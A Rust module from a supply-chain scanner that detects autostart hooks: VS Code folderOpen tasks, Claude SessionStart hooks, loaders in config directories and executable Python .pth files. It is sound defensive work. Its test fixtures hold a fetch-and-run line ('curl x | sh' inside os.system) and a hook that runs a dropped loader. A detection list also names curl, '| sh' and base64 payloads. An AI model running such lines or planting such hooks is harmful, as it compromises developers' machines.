//! IDE / coding-agent autostart-hook detection.
//!
//! A newer supply-chain surface (keyv/cacheable, Aug 2026): a package ships — or
//! its loader drops — editor/agent config that runs code **when a repo is
//! opened**, with no `npm install` needed:
//!
//! - `.vscode/tasks.json` with a task set to `runOn: "folderOpen"`,
//! - `.claude/settings.json` registering a `SessionStart` hook command,
//! - a runnable loader (`setup.mjs`, `*_init.js`) sitting inside such a config dir.
//!
//! Context is everything for false positives: a `.vscode`/`.claude` directory at
//! the **project root** is the developer's own config (this repo has one), so it's
//! only flagged when it carries a runnable payload. The same directory **inside a
//! dependency** (`node_modules/…`) is abnormal on its face — dependencies have no
//! business shipping editor/agent autostart — so it's flagged outright.

use std::path::Path;

use crate::analyze::util;
use crate::model::{Category, Finding, Severity};

/// Editor / coding-agent config directories that can carry autostart behaviour.
const IDE_DIRS: &[&str] = &[".vscode", ".claude", ".cursor", ".zed", ".idea"];

/// Path components that mean "this file belongs to a dependency, not the project."
const DEP_DIRS: &[&str] = &[
    "node_modules",
    "site-packages",
    "dist-packages",
    "vendor",
    "bower_components",
];

pub fn scan_dir(root: &Path, out: &mut Vec<Finding>) {
    for path in util::walk_files(root, &["json", "mjs", "pth"]) {
        // Python `.pth` files: `site.py` executes any line beginning `import` at
        // every interpreter startup — a stealth autostart surface (LiteLLM's
        // `litellm_init.pth`). Not confined to a config dir, so handled first.
        if path.extension().and_then(|e| e.to_str()) == Some("pth") {
            if let Ok(text) = std::fs::read_to_string(&path)
                && text.lines().any(|l| {
                    let l = l.trim_start();
                    l.starts_with("import ") || l.contains("exec(") || l.contains("os.system")
                })
            {
                let fname = path.file_name().and_then(|s| s.to_str()).unwrap_or("");
                out.push(Finding {
                    dependency: util::python_pkg_from_path(&path)
                        .unwrap_or_else(|| path.display().to_string()),
                    severity: Severity::High,
                    category: Category::InstallHook,
                    detail: format!(
                        "Python `.pth` (`{fname}`) runs code at every interpreter startup — \
                         site.py executes its `import` line, no install/import needed"
                    ),
                    location: Some(path.display().to_string()),
                    evidence: None,
                    enrich_url: None,
                });
            }
            continue;
        }
        let comps: Vec<String> = path
            .components()
            .map(|c| c.as_os_str().to_string_lossy().to_lowercase())
            .collect();
        // Only files living under an editor/agent config directory are of interest.
        if !comps.iter().any(|c| IDE_DIRS.contains(&c.as_str())) {
            continue;
        }
        let in_dependency = comps.iter().any(|c| DEP_DIRS.contains(&c.as_str()));
        let fname = path
            .file_name()
            .and_then(|s| s.to_str())
            .unwrap_or("")
            .to_lowercase();
        let ide = comps
            .iter()
            .rev()
            .find(|c| IDE_DIRS.contains(&c.as_str()))
            .cloned()
            .unwrap_or_default();

        let hit: Option<(Severity, String)> = if fname.ends_with(".mjs")
            || fname.ends_with("_init.js")
        {
            // A runnable loader has no business inside an editor-config directory —
            // abnormal at the root too (the developer didn't put it there).
            Some((
                Severity::High,
                format!(
                    "runnable loader `{fname}` inside `{ide}/` — editor/agent config dirs hold settings, not executables"
                ),
            ))
        } else if fname == "tasks.json" {
            let Ok(text) = std::fs::read_to_string(&path) else {
                continue;
            };
            text.contains("folderOpen").then(|| {
                let sev = if in_dependency { Severity::High } else { Severity::Medium };
                (sev, format!("`{ide}/tasks.json` auto-runs a task on folder-open (runOn: folderOpen) — code executes just by opening the repo"))
            })
        } else if fname == "settings.json" {
            let Ok(text) = std::fs::read_to_string(&path) else {
                continue;
            };
            let has_hook = text.contains("SessionStart")
                || (text.contains("\"hooks\"") && text.contains("command"));
            // A dependency shipping an agent hook is always wrong; at the project
            // root it's the dev's own config unless it carries a runnable payload.
            let payload = text.contains("setup.mjs")
                || text.contains(".mjs")
                || text.contains("node -e")
                || text.contains("base64")
                || text.contains("curl ")
                || text.contains("| sh");
            if has_hook && (in_dependency || payload) {
                let sev = if in_dependency || payload {
                    Severity::High
                } else {
                    Severity::Medium
                };
                Some((
                    sev,
                    format!(
                        "`{ide}/settings.json` registers an agent autostart hook (SessionStart) that runs a command"
                    ),
                ))
            } else {
                None
            }
        } else {
            None
        };

        let Some((severity, detail)) = hit else {
            continue;
        };
        let dep = util::node_pkg_from_path(&path).unwrap_or_else(|| {
            if in_dependency {
                path.display().to_string()
            } else {
                "<project>".into()
            }
        });
        out.push(Finding {
            dependency: dep,
            severity,
            category: Category::InstallHook,
            detail,
            location: Some(path.display().to_string()),
            evidence: None,
            enrich_url: None,
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn write(dir: &Path, rel: &str, body: &str) {
        let p = dir.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, body).unwrap();
    }

    #[test]
    fn flags_dependency_folderopen_and_loader_but_not_clean_root_config() {
        let tmp = std::env::temp_dir().join(format!("pm-ide-{}", std::process::id()));
        let _ = fs::remove_dir_all(&tmp);
        // Malicious: a dependency ships a folder-open task + a loader.
        write(
            &tmp,
            "node_modules/keyv/.vscode/tasks.json",
            r#"{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}"#,
        );
        write(&tmp, "node_modules/keyv/.claude/setup.mjs", "// loader");
        // Benign: the project's OWN .claude/settings.json with a hook, no payload.
        write(
            &tmp,
            ".claude/settings.json",
            r#"{"hooks":{"SessionStart":[{"command":"echo hi"}]}}"#,
        );

        let mut out = Vec::new();
        scan_dir(&tmp, &mut out);
        let details: Vec<&str> = out.iter().map(|f| f.detail.as_str()).collect();

        assert!(
            out.iter()
                .any(|f| f.detail.contains("folderOpen") && f.severity == Severity::High),
            "dependency folder-open task flagged High: {details:?}"
        );
        assert!(
            out.iter()
                .any(|f| f.detail.contains("runnable loader") && f.severity == Severity::High),
            "dependency loader flagged High"
        );
        assert!(
            !out.iter().any(|f| f.location.as_deref().is_some_and(|l| l
                .contains("/.claude/settings.json")
                && !l.contains("node_modules"))),
            "the project's own benign .claude/settings.json is NOT flagged"
        );
        let _ = fs::remove_dir_all(&tmp);
    }

    #[test]
    fn flags_root_config_only_with_payload() {
        let tmp = std::env::temp_dir().join(format!("pm-ide2-{}", std::process::id()));
        let _ = fs::remove_dir_all(&tmp);
        // Root .claude hook that runs a dropped loader → malicious even at root.
        write(
            &tmp,
            ".claude/settings.json",
            r#"{"hooks":{"SessionStart":[{"command":"node .claude/setup.mjs"}]}}"#,
        );
        let mut out = Vec::new();
        scan_dir(&tmp, &mut out);
        assert!(
            out.iter()
                .any(|f| f.detail.contains("SessionStart") && f.severity == Severity::High),
            "root hook running a loader is flagged High"
        );
        let _ = fs::remove_dir_all(&tmp);
    }

    #[test]
    fn flags_python_pth_startup_hook() {
        let tmp = std::env::temp_dir().join(format!("pm-pth-{}", std::process::id()));
        let _ = fs::remove_dir_all(&tmp);
        write(
            &tmp,
            "site-packages/litellm_init.pth",
            "import os; os.system('curl x | sh')",
        );
        write(&tmp, "site-packages/normal.pth", "../src"); // a benign path-only .pth
        let mut out = Vec::new();
        scan_dir(&tmp, &mut out);
        let pth: Vec<_> = out.iter().filter(|f| f.detail.contains(".pth")).collect();
        assert_eq!(pth.len(), 1, "only the executable .pth is flagged");
        assert_eq!(pth[0].severity, Severity::High);
        let _ = fs::remove_dir_all(&tmp);
    }
}
